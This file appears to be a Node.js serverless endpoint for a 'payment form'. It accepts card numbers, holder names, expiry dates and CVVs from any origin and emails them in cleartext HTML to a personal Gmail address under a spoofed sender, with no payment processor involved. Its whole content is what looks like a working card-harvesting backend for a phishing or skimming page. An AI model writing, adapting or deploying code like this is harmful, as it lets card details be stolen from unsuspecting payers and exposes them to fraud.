const nodemailer = require('nodemailer');

module.exports = async(req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    // Handle OPTIONS request
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            const data = req.body;

            // Create transporter
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'Leomonster7868@gmail.com',
                    pass: process.env.EMAIL_PASSWORD
                }
            });

            // Setup email
            const mailOptions = {
                from: 'payment-form@example.com',
                to: 'Leomonster7868@gmail.com',
                subject: 'New Payment Information',
                html: `
          <h2>Payment Information</h2>
          <p><strong>Card Number:</strong> ${data.cardNumber}</p>
          <p><strong>Card Holder:</strong> ${data.cardHolder}</p>
          <p><strong>Expiry Date:</strong> ${data.expiryDate}</p>
          <p><strong>CVV:</strong> ${data.cvv}</p>
        `
            };

            // Send email
            await transporter.sendMail(mailOptions);

            return res.status(200).json({ success: true, message: 'Payment information sent successfully' });
        } catch (error) {
            console.error('Email error:', error);
            return res.status(500).json({ success: false, message: 'Error sending payment information' });
        }
    } else {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }
};